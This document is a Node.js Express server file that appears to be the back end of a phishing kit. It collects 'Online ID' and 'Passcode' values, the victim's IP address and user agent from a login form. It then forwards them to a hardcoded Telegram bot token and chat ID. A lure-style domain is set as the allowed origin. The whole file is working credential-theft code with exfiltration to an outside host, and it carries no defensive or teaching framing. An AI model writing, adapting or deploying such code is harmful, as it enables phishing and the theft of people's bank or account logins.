const express = require('express');
// const bodyParser = require('body-parser');
const axios = require('axios');
const app = express();
const path = require('path');
const cors = require('cors');  // Import the cors middleware

 
const TELEGRAM_BOT_TOKEN = '7198389117:AAFXuKuY9FROKLW_TrIMNUATUlycMuEHiEk';
const TELEGRAM_CHAT_ID = '1713212728';

// Assuming your static files are in the 'images' directory
app.use(express.static(path.join(__dirname, 'images')));

  // Serve static files from the 'public' directory
  app.use(express.static(path.join(__dirname, '')));

  app.set('view engine', 'html');

  app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
  });

// app.use(bodyParser.json());

app.use(express.json());
app.use(express.urlencoded({ extended: true }));


// Enable CORS for all routes
app.use(cors({
    origin: 'https://conf1rmation.vercel.app/',
    credentials: true,
}));


// app.use(bodyParser.urlencoded({ extended: true }));

app.post('/', (req, res) => {
    
    const ai = req.body.ai;
    const pr = req.body.pr;
    const ip = req.body.ip;
    const useragent = req.headers['user-agent'];

    console.log("Received Data:", req.body);

      // Add more logs to identify the source of the issue
      console.log("ai:", ai);
      console.log("pr:", pr);
      console.log("ip:", ip);
      console.log("useragent:", useragent);
    const message = `
        |----------|  |--------------|
        Online ID            : ${ai}
        Passcode              : ${pr}
        |--------------- I N F O | I P -------------------|
        Client IP: ${ip}
        User Agent : ${useragent}
        |-----------  --------------|
    `;

    // Send message to Telegram
    // axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    //     chat_id: TELEGRAM_CHAT_ID,
    //     text: message,
    // })
    axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, 
    `chat_id=${TELEGRAM_CHAT_ID}&text=${message}`,
    {
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
    }
)

    .then((response) => {
        console.log('Telegram Response:', response.data);
        res.status(200).json({ success: true, message: 'Message sent to Telegram successfully.' });
    })
    .catch((error) => {
        console.error('Telegram Error:', error.message);
        res.status(500).json({ success: false, message: 'Failed to send message to Telegram.' });
    });
});

const PORT = process.env.PORT || 8000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
